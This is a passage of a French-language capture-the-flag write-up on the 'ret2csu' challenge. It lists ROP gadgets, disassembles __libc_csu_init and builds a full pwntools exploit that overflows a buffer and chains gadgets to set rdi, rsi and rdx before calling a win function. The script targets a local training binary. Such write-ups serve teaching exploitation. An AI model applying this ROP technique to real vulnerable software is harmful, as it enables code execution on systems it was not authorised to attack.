<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069c</span> : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069e</span> : pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a0</span> : pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a2</span> : pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400604</span> : pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040057b</span> : pop rbp ; mov edi, <span style="color:#ae81ff">0x601038</span> ; jmp rax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069b</span> : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069f</span> : pop rbp ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400588</span> : pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a3</span> : pop rdi ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a1</span> : pop rsi ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069d</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span></code></pre></div><p>On voit qu&rsquo;on a un <code>pop rdi</code>, un <code>pop rsi</code> mais pas de <code>pop rdx</code>, donc impossible de modifier la valeur de <code>rdx</code>.</p>
<p>Voyons voir si un <code>mov</code> pourrait nous aider:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005e2</span> : mov byte ptr [rip <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x200a4f</span>], <span style="color:#ae81ff">1</span> ; pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400610</span> : mov eax, <span style="color:#ae81ff">0</span> ; pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400602</span> : mov ebp, esp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040057c</span> : mov edi, <span style="color:#ae81ff">0x601038</span> ; jmp rax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400601</span> : mov rbp, rsp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span></code></pre></div><p>Non, rien d&rsquo;utile ici&hellip; On va donc devoir effectuer un <code>ret2csu</code> pour pouvoir modifier nos trois registres.</p>
<p>Dans la plupart des éxecutables <code>ELF</code>, on retrouve une fonction nommée <code>__libc_csu_init</code> (si vous voulez savoir en détail ce qu&rsquo;elle fait, je vous invite à lire <a href="https://stackoverflow.com/questions/61649960/why-do-program-level-constructors-get-called-by-libc-csu-init-but-destructor">ceci</a>). C&rsquo;est cette dernière qui va nous permettre de contrôler (entre autres) <code>rdx</code>.</p>
<p>On peut la désassembler pour voir un peu à quoi elle ressemble:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>disass __libc_csu_init 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function __libc_csu_init:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400640</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	push   r15
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400642</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;</span>:	push   r14
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400644</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	mov    r15,rdx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400647</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">7</span><span style="color:#f92672">&gt;</span>:	push   r13
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400649</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span>:	push   r12
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040064b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:	lea    r12,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20079e</span>]        <span style="color:#75715e"># 0x600df0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400652</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">&gt;</span>:	push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400653</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">19</span><span style="color:#f92672">&gt;</span>:	lea    rbp,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20079e</span>]        <span style="color:#75715e"># 0x600df8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040065a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">26</span><span style="color:#f92672">&gt;</span>:	push   rbx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040065b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">27</span><span style="color:#f92672">&gt;</span>:	mov    r13d,edi
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040065e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;</span>:	mov    r14,rsi
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400661</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:	sub    rbp,r12
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400664</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;</span>:	sub    rsp,<span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400668</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">40</span><span style="color:#f92672">&gt;</span>:	sar    rbp,<span style="color:#ae81ff">0x3</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040066c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x4004d0</span> <span style="color:#f92672">&lt;</span>_init<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400671</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">49</span><span style="color:#f92672">&gt;</span>:	test   rbp,rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400674</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">52</span><span style="color:#f92672">&gt;</span>:	je     <span style="color:#ae81ff">0x400696</span> <span style="color:#f92672">&lt;</span>__libc_csu_init<span style="color:#f92672">+</span><span style="color:#ae81ff">86</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400676</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>:	xor    ebx,ebx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400678</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">56</span><span style="color:#f92672">&gt;</span>:	nop    DWORD PTR [rax<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400680</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:	mov    rdx,r15
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400683</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">67</span><span style="color:#f92672">&gt;</span>:	mov    rsi,r14
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400686</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">70</span><span style="color:#f92672">&gt;</span>:	mov    edi,r13d
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400689</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">73</span><span style="color:#f92672">&gt;</span>:	call   QWORD PTR [r12<span style="color:#f92672">+</span>rbx<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040068d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">77</span><span style="color:#f92672">&gt;</span>:	add    rbx,<span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400691</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">81</span><span style="color:#f92672">&gt;</span>:	cmp    rbp,rbx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400694</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">84</span><span style="color:#f92672">&gt;</span>:	jne    <span style="color:#ae81ff">0x400680</span> <span style="color:#f92672">&lt;</span>__libc_csu_init<span style="color:#f92672">+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400696</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">86</span><span style="color:#f92672">&gt;</span>:	add    rsp,<span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040069a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">90</span><span style="color:#f92672">&gt;</span>:	pop    rbx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040069b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">91</span><span style="color:#f92672">&gt;</span>:	pop    rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040069c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">92</span><span style="color:#f92672">&gt;</span>:	pop    r12
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040069e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">94</span><span style="color:#f92672">&gt;</span>:	pop    r13
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006a0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">96</span><span style="color:#f92672">&gt;</span>:	pop    r14
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006a2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">98</span><span style="color:#f92672">&gt;</span>:	pop    r15
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006a4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">100</span><span style="color:#f92672">&gt;</span>:	ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>Comme vous l&rsquo;avez peut-être remarqué, on retrouve une série d&rsquo;instructions <code>pop</code> suivies d&rsquo;un <code>ret</code>, et au dessus, des instructions <code>mov</code> qui placent les valeurs des registres modifiés en dessous dans <code>rdx</code>, <code>rsi</code> et <code>edi</code>.</p>
<p>Le principe du <code>ret2csu</code> est donc de <em>jump</em> au premier <code>pop rbx</code>, puis une fois à l&rsquo;instruction <code>ret</code>, <em>jump</em> sur le premier <code>mov rdx, r15</code> pour avoir le contrôle sur le contenu du registre <code>rdx</code> ainsi que <code>rsi</code> et <code>edi</code>.</p>
<p>Vous l&rsquo;avez peut-être remarqué, mais le dernier <code>mov</code> est un <code>mov edi, r13d</code> et non pas un <code>mov rdi, r13</code>, on devra donc re-modifier la valeur de <code>rdi</code> après ceci mais ce n&rsquo;est pas un problème puisque nous avons un <code>pop rdi ; ret</code> pour le faire.</p>
<p>Commençons notre exploit avec tout d&rsquo;abord le padding et la première partie:</p>
<blockquote>
<p>Je n&rsquo;explique pas comment trouver les adresses utilisées puisque je pars du principe que vous avez vu les précédents writeups et que vous savez le faire, si ce n&rsquo;est pas le cas vous pouvez allez voir les premiers exercices</p></blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;ret2csu&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    init <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x600e38</span>
</span></span><span style="display:flex;"><span>    win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400510</span>
</span></span><span style="display:flex;"><span>    pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4006a3</span>
</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4004e6</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    csu_pops <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40069a</span>
</span></span><span style="display:flex;"><span>    csu_movs <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400680</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> padding <span style="color:#75715e"># Padding de 40 bytes pour commencer à réecrire RIP</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(ret) <span style="color:#75715e"># Patch l&#39;alignement de la stack (Ubuntu)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(csu_pops) <span style="color:#75715e"># Pop rbx, rbp, r12, r13, r14, r15</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># 0 dans RBX</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x01</span>) <span style="color:#75715e"># 1 dans RBP pour que la comparaison RBX === RBP soit vraie</span>
</span></span><span style="display:flex;"><span>                         <span style="color:#75715e"># (la valeur de RBX sera incrémentée de 1 avant la comparaison)</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(init) <span style="color:#75715e"># r12 = init (pour le call QWORD PTR [r12+rbx*8] d&#39;après)</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>) <span style="color:#75715e"># r13</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xcafebabecafebabe</span>) <span style="color:#75715e"># r14</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xd00df00dd00df00d</span>) <span style="color:#75715e"># r15</span>
</span></span></code></pre></div><p>Ici, on va donc <em>jump</em> sur la série de <code>pop</code>. On met tout d&rsquo;abord <code>0</code> dans <code>rbx</code> et <code>1</code> dans <code>RBP</code> puisque si on regarde les lignes qui suivent les <code>mov</code> on voit ceci:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add    rbx,<span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>cmp    rbp,rbx
</span></span><span style="display:flex;"><span>jne    <span style="color:#ae81ff">0x400680</span> <span style="color:#f92672">&lt;</span>__libc_csu_init<span style="color:#f92672">+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>Ici, on ajoute <code>1</code> à la valeur de <code>rbx</code> puis on compare les registres <code>rbp</code> et <code>rbx</code> et si il ne sont pas égaux on jump plus haut dans la fonction, or ce n&rsquo;est pas ce qu&rsquo;on veut. On fait donc en sorte que les deux valeurs soient égales lors de la comparaison.</p>
<p>La valeur <code>init</code> mise dans <code>r12</code> est une valeur arbitraire, elle permet de mener à bien le <code>call QWORD PTR [r12+rbx*8]</code> qui suit.</p>
<p>Enfin, on place nos paramètres voulus dans <code>r13</code>, <code>r14</code> et <code>r15</code> puisque ce seront les valeurs qui finiront dans <code>rdx</code>, <code>rsi</code> et <code>edi</code>.</p>
<p>Passons maintenant à la deuxième partie de l&rsquo;exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(csu_movs) <span style="color:#75715e"># rdx = r15, rsi = r14, edi = r13d</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># Puisque qu&#39;il n&#39;y a pas de ret après les mov</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># on va re-pop rbx, rbp, r12 etc...</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># et on les remplis donc de null bytes</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># puisqu&#39;on ne va plus les utiliser</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(pop_rdi) <span style="color:#75715e"># On remet la bonne valeur dans rdi</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(ret)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(win)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Flag:&#34;</span>, r<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>Cette fois, on saute donc à la série de <code>mov</code>. Après cette dernière, puisque la comparaison est validée, les valeurs des registres <code>rbx</code>, <code>rbp</code>, <code>r12</code>, <code>r13</code>, <code>r14</code> et <code>r15</code> sont re-modifiées et on doit donc y mettre des <em>null bytes</em>.</p>
<p>Enfin, on <code>pop rdi</code>, on y remet notre paramètre et on jump sur la fonction <code>ret2win</code>.</p>
<h2 id="final-payload">Final Payload</h2>
<p>Voici donc l&rsquo;exploit complet:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;ret2csu&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    init <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x600e38</span>
</span></span><span style="display:flex;"><span>    win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400510</span>
</span></span><span style="display:flex;"><span>    pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4006a3</span>
</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4004e6</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    csu_pops <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40069a</span>
</span></span><span style="display:flex;"><span>    csu_movs <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400680</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> padding <span style="color:#75715e"># Padding de 40 bytes pour commencer à réecrire RIP</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(ret) <span style="color:#75715e"># Patch l&#39;alignement de la stack (Ubuntu)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(csu_pops) <span style="color:#75715e"># Pop rbx, rbp, r12, r13, r14, r15</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># 0 dans RBX</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x01</span>) <span style="color:#75715e"># 1 dans RBP pour que la comparaison RBX === RBP soit vraie</span>
</span></span><span style="display:flex;"><span>                         <span style="color:#75715e"># (la valeur de RBX sera incrémentée de 1 avant la comparaison)</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(init) <span style="color:#75715e"># r12 = init (pour le call QWORD PTR [r12+rbx*8] d&#39;après)</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>) <span style="color:#75715e"># r13</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xcafebabecafebabe</span>) <span style="color:#75715e"># r14</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xd00df00dd00df00d</span>) <span style="color:#75715e"># r15</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(csu_movs) <span style="color:#75715e"># rdx = r15, rsi = r14, edi = r13d</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># Puisque qu&#39;il n&#39;y a pas de ret après les mov</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># on va re-pop rbx, rbp, r12 etc...</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># et on les remplis donc de null bytes</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># puisqu&#39;on ne va plus les utiliser</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(pop_rdi) <span style="color:#75715e"># On remet la bonne valeur dans rdi</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(ret)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(win)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Flag:&#34;</span>, r<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>On peut vérifier qu&rsquo;il fonctionne:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/224578372-184e1e8a-1472-4ebd-91a1-48255bf7fef2.png" alt="2023-03-12-233951_1013x653_scrot"></p>
<p>GG !</p>
]]></content>
